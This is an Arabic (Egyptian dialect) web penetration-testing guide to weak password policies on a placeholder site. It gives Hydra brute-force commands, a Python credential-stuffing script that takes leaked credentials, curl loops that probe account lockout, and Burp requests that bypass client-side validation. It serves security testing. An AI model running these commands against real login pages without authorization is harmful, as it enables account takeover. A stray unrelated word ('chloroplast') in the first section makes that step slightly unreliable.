## هام جدا 
- السيناريوهات اللي بقولهالك هي فكره ممكن تحصل لكن مش شرط تعمل نفس الخطوات الموجوده يعني مثلا يمكن استخدم نفس التوكين ل email تاني مش شرط تعمل نفس الخطوات اللي مديهالك  لكن ممكن تدور علي طريقه تعمل السيناريو ده 


### **الخطوة الأولى: اختبار سياسات كلمات المرور الضعيفة**

**الوصف**: سياسات كلمات المرور الضعيفة هي لما الموقع يسمح للمستخدمين يستخدموا كلمات مرور سهلة التخمين (مثل "password" أو "123456") أو ما يفرضش قيود على الطول أو التعقيد. ده بيخلي الحسابات معرضة لهجمات **Brute Force** أو **Credential Stuffing**.

**طريقة الاختبار**: هنختبر صفحة تسجيل الدخول وصفحة إنشاء الحساب بشكل منهجي عشان نكتشف أي ثغرات في فرض كلمات المرور، الحماية ضد الهجمات، أو التحقق من البيانات. تحت هلاقي **كل المحاولات الممكنة** مقسمة حسب الطريقة.

---

## **المحاولة الأولى: اختبار يدوي بكلمات مرور ضعيفة شائعة**
**الهدف**: نشوف إذا كان الموقع بيقبل كلمات مرور ضعيفة أو إذا كان فيه حسابات تم إنشاؤها بكلمات زي دي.
- **الخطوات**:
  1. افتح صفحة تسجيل الدخول (`https://target.com/login`).
  2. جرب تسجيل دخول بحسابات متوقعة (مثل `admin`، `user`، `test`) مع كلمات مرور شائعة.
  3. لاحظ إذا نجحت عملية تسجيل الدخول أو إذا الموقع رد برسالة خطأ (مثل "كلمة المرور غلط").
  4. chloroplast إذا فيه قيود على عدد المحاولات (مثل قفل الحساب بعد 5 محاولات فاشلة).
- **كلمات المرور اللي هنجربها**:
  - `password`
  - `123456`
  - `qwerty`
  - `admin`
  - `Password1`
  - `letmein`
  - `welcome`
  - `abc123`
  - `111111`
  - `monkey`
  - قائمة أكبر: استخدم جزء من ملف **rockyou.txt** (موجود في Kali Linux أو أونلاين) اللي فيه أشهر 100 كلمة مرور.
- **النتيجة المتوقعة**:
  - نجاح: تسجيل الدخول بكلمة زي `password`، يعني الموقع فيه حسابات بكلمات ضعيفة.
  - فشل: رسالة "كلمة المرور غلط" أو قفل الحساب بعد محاولات.
- **الأدوات**:
  - متصفح (مثل Chrome أو Firefox).
  - أدوات المتصفح (DevTools) عشان تتأكد من حقول الإدخال والردود.
- **الأوامر**:
  - مفيش أوامر محددة، بس هتكتب كلمات المرور يدويًا في الصفحة.
  - مثال: اكتب `username: admin`، `password: password` واضغط تسجيل.

---

## **المحاولة التانية: اختبار سياسة كلمات المرور أثناء إنشاء الحساب**
**الهدف**: نشوف إذا كان الموقع بيسمح بإنشاء حسابات بكلمات مرور ضعيفة.
- **الخطوات**:
  1. روح لصفحة التسجيل (مثل `https://target.com/register`).
  2. جرب إنشاء حساب بكلمات مرور ضعيفة بأطوال وتعقيدات مختلفة.
  3. شوف إذا فيه تحقق من جانب العميل (مثل تنبيهات JavaScript) أو تحقق من جانب السيرفر.
  4. استخدم DevTools عشان تتفقد خصائص حقل كلمة المرور (مثل `minlength` أو `pattern`).
  5. جرب تخطي التحقق من جانب العميل باستخدام Burp Suite عن طريق تعديل الطلب.
- **كلمات المرور اللي هنجربها**:
  - قصيرة: `a`، `123`، `pass`
  - بدون تعقيد: `password`، `aaaaaa`
  - أنماط شائعة: `qwerty`، `12345678`
  - نوع واحد من الحروف: `11111111`، `abcdefgh`
  - نفس اسم المستخدم: كلمة المرور زي اسم المستخدم (مثل `test` لاسم مستخدم `test`).
- **النتيجة المتوقعة**:
  - نجاح: إنشاء حساب بكلمة ضعيفة، يعني سياسة كلمات المرور ضعيفة.
  - فشل: رسالة زي "كلمة المرور لازم تكون 8 حروف على الأقل مع رقم ورمز".
- **الأدوات**:
  - ال DevTools: تفقد `<input type="password">` لخصائص زي `minlength="8"` أو `required`.
  - Burp Suite: اعترض وعدل طلب التسجيل عشان تتخطى التحقق من جانب العميل.
- **الأوامر**:
  - استخدم Burp Proxy عشان تعترض طلب التسجيل.
  - مثال طلب معدل (لتخطي التحقق):
    - **POST /register**
    - **Host**: target.com
    - **Content-Type**: application/x-www-form-urlencoded
    - **Body**: username=test&password=123&email=test@example.com

---

## **المحاولة التالتة: هجوم Brute Force باستخدام Hydra**
**الهدف**: أتمتة محاولات تسجيل الدخول عشان نشوف إذا كان فيه كلمات مرور ضعيفة أو قيود على المحاولات.
- **الخطوات**:
  1. حدد حقول صفحة تسجيل الدخول (مثل `username`، `password`) باستخدام Burp Suite أو DevTools.
  2. لاحظ الرابط وطريقة الإرسال (مثل POST لـ `/login`).
  3. جهز قائمة بكلمات مرور شائعة (مثل `rockyou.txt` أو قائمة مخصصة).
  4. استخدم Hydra عشان تهجم على اسم مستخدم معروف أو متوقع.
  5. راقب إذا فيه قيود على المحاولات، CAPTCHA، أو حظر IP.
- **كلمات المرور والحسابات**:
  - اسم مستخدم: `admin`، `user`، `test`، أو قائمة من خطوة Username Enumeration لو عملتها.
  - قائمة كلمات المرور: `rockyou.txt` أو قائمة مخصصة:
    ```
    password
    123456
    qwerty
    Password1
    admin123
    ```
- **النتيجة المتوقعة**:
  - نجاح: Hydra يلاقي كلمة مرور صحيحة، يعني كلمات المرور ضعيفة.
  - فشل: قفل الحساب، CAPTCHA، أو رد HTTP 429 (عدد محاولات كتير).
- **الأدوات**:
  - **Hydra** (موجود في Kali Linux).
- **الأوامر**:
  - أمر Hydra أساسي لنموذج HTTP POST:
    ```bash
    hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
    ```
    - `-l admin`: اسم مستخدم واحد.
    - `-P passwords.txt`: ملف بكلمات المرور.
    - `http-post-form`: حدد مسار النموذج والبيانات.
    - `F=incorrect`: النص اللي بيظهر في رد الفشل (مثل "كلمة المرور غلط").
  - مع أكتر من اسم مستخدم:
    ```bash
    hydra -L usernames.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
    ```
  - عدل البيانات بناءً على فحص النموذج (مثل `login` بدل `username`).

---

## **المحاولة الرابعة: Credential Stuffing ببيانات مسربة**
**الهدف**: نشوف إذا كان الحسابات معرضة لكلمات مرور مستخدمة في مواقع تانية تم تسريبها.
- **الخطوات**:
  1. جيب قائمة ببيانات مسربة من قواعد بيانات عامة (مثل HaveIBeenPwned أو تسريبات الدارك ويب، بشكل أخلاقي).
  2. استخرج أسماء المستخدمين/الإيميلات وكلمات المرور اللي ممكن تكون متعلقة بالموقع.
  3. استخدم Burp Suite Intruder أو سكربت مخصص عشان تختبر البيانات دي على صفحة تسجيل الدخول.
  4. راقب إذا فيه تسجيلات ناجحة أو قيود على المحاولات.
- **البيانات اللي هنجربها**:
  - أزواج بيانات (مثل `user@example.com:password123`، `admin:admin123`).
  - مثال قائمة:
    ```
    user1@example.com:qwerty
    user2@example.com:123456
    admin@example.com:Password1
    ```
- **النتيجة المتوقعة**:
  - نجاح: تسجيل دخول ببيانات مسربة، يعني المستخدمين بيعيدوا استخدام كلمات المرور.
  - فشل: مفيش تسجيلات ناجحة أو فيه قيود على المحاولات.
- **الأدوات**:
  - **Burp Suite Intruder**:
    - اعترض طلب تسجيل الدخول.
    - حدد أماكن `username` و`password` للبيانات.
    - حمل قائمة البيانات وابدأ الهجوم.
  - **سكربت Python** (باستخدام `requests`):
    ```python
    import requests

    url = "https://target.com/login"
    credentials = [
        {"username": "user1@example.com", "password": "qwerty"},
        {"username": "user2@example.com", "password": "123456"}
    ]

    for cred in credentials:
        response = requests.post(url, data={"username": cred["username"], "password": cred["password"]})
        if "incorrect" not in response.text.lower():
            print(f"نجاح: {cred['username']}:{cred['password']}")
        else:
            print(f"فشل: {cred['username']}:{cred['password']}")
    ```
- **الأوامر**:
  - Burp Intruder: جهز قائمة البيانات وابدأ.
  - Python: `python credential_stuffing.py` (احفظ السكربت فوق).

---

## **المحاولة الخامسة: اختبار قيود المحاولات وقفل الحساب**
**الهدف**: نشوف إذا كان الموقع بيمنع هجمات Brute Force عن طريق قيود أو قفل الحساب.
- **الخطوات**:
  1. جرب يدويًا إدخال 5–10 كلمات مرور غلط لنفس اسم المستخدم.
  2. لاحظ رد الموقع:
     - ظهور CAPTCHA.
     - قفل مؤقت للحساب (مثل "الحساب مقفول لمدة 15 دقيقة").
     - رد HTTP 429 (محاولات كتير).
     - حظر IP.
  3. استخدم Burp Suite عشان ترسل طلبات سريعة وتراقب الردود.
  4. اختبر إذا القفل بيشتغل على كل الواجهات (مثل الويب، API، تطبيق الموبايل).
- **البيانات اللي هنجربها**:
  - اسم مستخدم: `test` أو حساب معروف.
  - كلمات مرور: أي حاجة غلط (مثل `wrongpass1`، `wrongpass2`).
- **النتيجة المتوقعة**:
  - قوي: قفل الحساب بعد 5 محاولات أو ظهور CAPTCHA.
  - ضعيف: محاولات غير محدودة أو القفل يتخطى بسهولة (مثل عبر API).
- **الأدوات**:
  - **متصفح**: محاولات يدوية.
  - **Burp Suite Sequencer** أو **Intruder**:
    - أرسل 20+ طلب تسجيل دخول بكلمات مرور غلط.
    - حلل أكواد الرد والرسائل.
  - **cURL**:
    ```bash
    for i in {1..10}; do curl -X POST -d "username=test&password=wrong$i" https://target.com/login; done
    ```
- **الأوامر**
  - cURL: `for i in {1..10}; do curl -X POST -d "username=test&password=wrong$i" https://target.com/login; done`
  - Burp Intruder: جهز لإرسال محاولات متعددة.

---

## **المحاولة السادسة: اختبار إعادة استخدام كلمة المرور مع اسم المستخدم**
**الهدف**: نشوف إذا كان المستخدمين يقدروا يحطوا كلمة المرور نفس اسم المستخدم أو الإيميل.
- **الخطوات**:
  1. في صفحة التسجيل، أنشي حساب بـ `username: test` و`password: test`.
  2. جرب تسجيل الدخول بالبيانات دي.
  3. جرب أنواع تانية (مثل `username: user1@example.com`، `password: user1`).
  4. استخدم Burp Suite عشان تتخطى التحقق من جانب العميل لو النموذج رفض كلمات المرور المتشابهة.
- **البيانات اللي هنجربها**:
  - `username: test`، `password: test`
  - `username: user1@example.com`، `password: user1`
  - `username: admin`، `password: admin`
- **النتيجة المتوقعة**:
  - نجاح: إنشاء الحساب وتسجيل الدخول، يعني سياسة ضعيفة.
  - فشل: رسالة زي "كلمة المرور مينفعش تكون زي اسم المستخدم".
- **الأدوات**:
  - متصفح: تسجيل يدوي.
  - Burp Suite: عدل طلب التسجيل.
- **الأوامر**:
  - طلب معدل في Burp:
    - **POST /register**
    - **Host**: target.com
    - **Content-Type**: application/x-www-form-urlencoded
    - **Body**: username=test&password=test&email=test@example.com

---

## **المحاولة السابعة: اختبار نقاط API لمعالجة كلمات المرور الضعيفة**
**الهدف**: نشوف إذا كان API الموقع (لو موجود) بيسمح بكلمات مرور ضعيفة أو بيتخطى قيود المحاولات.
- **الخطوات**:
  1. حدد نقاط API (مثل `/api/login`) من الوثائق أو خريطة الموقع في Burp Suite.
  2. أرسل طلبات تسجيل دخول للـ API بكلمات مرور ضعيفة.
  3. اختبر قيود المحاولات أو القفل في الـ API.
  4. استخدم أدوات زي Postman أو cURL عشان تؤتمت الطلبات.
- **البيانات اللي هنجربها**:
  - JSON:
    ```json
    {"username": "admin", "password": "password"}
    ```
  - بيانات نموذج: `username=admin&password=123456`
- **النتيجة المتوقعة**:
  - نجاح: الـ API بيقبل كلمات مرور ضعيفة أو مافيش قيود.
  - فشل: الـ API بيفرض نفس الحماية زي واجهة الويب.
- **الأدوات**:
  - **Postman**: أرسل طلبات API.
  - **cURL**:
    ```bash
    curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"password"}' https://target.com/api/login
    ```
  - **Burp Suite**: اعترض واختبر طلبات API.
- **الأوامر**:
  - cURL: `curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"password"}' https://target.com/api/login`

---

## **ملخص شامل لكل المحاولات والأوامر**

هنا قائمة بكل المحاولات مع الأوامر والأدوات الخاصة بيها لاختبار سياسات كلمات المرور الضعيفة:

1. **اختبار يدوي بكلمات مرور ضعيفة**:
   - **البيانات**: `password`، `123456`، `qwerty`، `Password1`، `admin`، إلخ.
   - **الأداة**: متصفح.
   - **الأمر**: مفيش؛ اكتب يدويًا في النموذج.

2. **اختبار سياسة كلمات المرور أثناء إنشاء الحساب**:
   - **البيانات**: `a`، `123`، `password`، `aaaaaa`، `qwerty`، `11111111`.
   - **الأدوات**: DevTools، Burp Suite.
   - **الأمر**:
     - **POST /register**
     - **Host**: target.com
     - **Content-Type**: application/x-www-form-urlencoded
     - **Body**: username=test&password=123&email=test@example.com

3. **Brute Force بـ Hydra**:
   - **البيانات**: `rockyou.txt` أو قائمة مخصصة (`password`، `123456`، إلخ).
   - **الأداة**: Hydra.
   - **الأوامر**:
     ```bash
     hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
     ```
     ```bash
     hydra -L usernames.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
     ```

4. **Credential Stuffing ببيانات مسربة**:
   - **البيانات**: `user1@example.com:qwerty`، `admin:admin123`، إلخ.
   - **الأدوات**: Burp Suite Intruder، سكربت Python.
   - **الأمر** (Python):
     ```python
     import requests
     url = "https://target.com/login"
     credentials = [{"username": "user1@example.com", "password": "qwerty"}, ...]
     for cred in credentials:
         response = requests.post(url, data={"username": cred["username"], "password": cred["password"]})
         if "incorrect" not in response.text.lower():
             print(f"نجاح: {cred['username']}:{cred['password']}")
         else:
             print(f"فشل: {cred['username']}:{cred['password']}")
     ```

5. **اختبار قيود المحاولات وقفل الحساب**:
   - **البيانات**: `username: test`، `password: wrong1`، `wrong2`، إلخ.
   - **الأدوات**: متصفح، Burp Suite، cURL.
   - **الأمر**:
     ```bash
     for i in {1..10}; do curl -X POST -d "username=test&password=wrong$i" https://target.com/login; done
     ```

6. **اختبار إعادة استخدام كلمة المرور مع اسم المستخدم**:
   - **البيانات**: `username: test`، `password: test`؛ `username: user1@example.com`، `password: user1`.
   - **الأدوات**: متصفح، Burp Suite.
   - **الأمر**:
     - **POST /register**
     - **Host**: target.com
     - **Content-Type**: application/x-www-form-urlencoded
     - **Body**: username=test&password=test&email=test@example.com

7. **اختبار نقاط API لمعالجة كلمات المرور**:
   - **البيانات**: `{"username": "admin", "password": "password"}`.
   - **الأدوات**: Postman، cURL، Burp Suite.
   - **الأمر**:
     ```bash
     curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"password"}' https://target.com/api/login
     ```

---

### **مثال لنتيجة السيناريو**
- **كلمة مرور ضعيفة**: تسجيل دخول ناجح بـ `admin:password`.
- **مافيش قيود**: 100+ محاولة بـ Hydra بدون CAPTCHA أو قفل.
- **تسجيل ضعيف**: إنشاء حساب بكلمة مرور `123`.
- **ثغرة API**: الـ API في `/api/login` بيقبل `admin:admin` بدون قيود.
